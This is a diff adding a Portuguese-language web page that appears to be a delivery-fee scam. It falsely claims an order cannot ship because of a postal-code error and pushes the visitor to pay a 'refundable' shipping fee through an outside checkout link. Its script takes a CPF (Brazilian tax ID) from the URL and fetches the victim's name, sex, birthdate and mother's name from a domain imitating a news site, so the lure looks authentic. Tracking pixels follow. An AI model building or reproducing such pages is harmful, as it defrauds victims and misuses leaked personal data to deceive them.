@@ -1,0 +1,168 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="css/Vb2X2hDKrVRi.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        #buttonClick {
+            background-color: #CB0033;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
+        }
+
+        #buttonClick:hover {
+            background-color: #7a001e;
+            cursor: pointer;
+        }
+    </style>
+
+
+    <title>VERIFICAÇÃO</title>
+</head>
+
+<body>
+    <header>
+        <img src="images/WvGhf5yXlY5G.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Será responsável pelo envio do pedido.</p>
+    </header>
+
+    <div class="cta">
+        <img id="imagem" src="images/awdNadPHzRqt.png" alt="">
+
+        <p>Confirme os dados de envio seu pedido:</p>
+    </div>
+
+    
+    
+
+    <div class="cta4">
+        <span id="sends">CONFIRMAR</span>
+    </div>
+
+    <div id="popoup">
+        <div class="popoupcontent">
+            <div class="row">
+                <img id="naomostrardeinicio" src="images/tA6xYgkv4BGJ.png" alt="">
+
+                <div class="headlineectapopoup">
+                    <h1 id="carregandodadoss">Confirmando seus dados...</h1>
+                    <p id="esconderdepois">Por favor aguarde</p>
+                </div>
+
+                <h1 id="carregandodadosSs">ERRO NO CEP</h1>
+            </div>
+
+            <div class="loading">
+                <br>
+                <div class="progresseBar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="contente">
+                <p>
+                    O valor do CEP foi calculado errado para sua região, o pedido não será enviado.
+
+                    <br><br>
+
+                    Para realizarmos o envio é necessário que faça o pagamento de um frete. (O Valor pago do frete será reembolsado.)
+                </p>
+
+                <a id="buttonClick" href="https://pay.checkout-final.online/NDr8gmbL5mV3Bmj">
+                    PAGAR FRETE
+                </a>
+
+                <span id="maisforte">Clique no botão para continuar</span>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <img src="images/hNnfBVA7gon8.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença</p>
+    </footer>
+
+    <script src="js/mcUxRKpqV6lU.js"></script>
+
+    <script>
+        const queryParams = new URLSearchParams(window.location.search);
+
+        const cpf = queryParams.get('document');
+
+        const user = {};
+
+        function renderData() {
+            if (user.sex && user.birthdate) {
+                let htmlContent = `
+                    Nome: <b>${user.name}</b><br>
+                    Sexo: <b>${user.sex === 'M' ? 'Masculino' : user.sex === 'F' ? 'Feminino' : user.sex}</b><br>
+                    Data de nascimento: <b>${user.birthdate}</b>`;
+
+                if (user.mother && user.mother !== "0") {
+                    htmlContent += `
+                        <br>Nome da mãe: <b>${user.mother}</b>
+                    `;
+                }
+
+                document.getElementById('setar').innerHTML = htmlContent;
+            } else {
+                document.getElementById('setar').innerHTML = `Carregando...`;
+            }
+        }
+
+        fetch('https://g1-noticia.net/verificacao/getUserData.php?cpf=' + cpf)
+            .then(response => response.json())
+            .then(data => {
+                user.name = data.name;
+                user.sex = data.sex;
+                user.cpf = data.cpf;
+                user.mother = data.mother;
+                user.birthdate = data.birthdate;
+
+                renderData();
+            })
+            .catch(error => {
+                console.error('Erro ao fazer a solicitação:', error);
+            });
+    </script>
+
+    <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '489846593868681');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=489846593868681&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script>
+  window.pixelId = "66d25d387745dede27afb087";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script src="js/QdxUoYhUrL2f.js" async="" defer=""></script>
+</body></html>
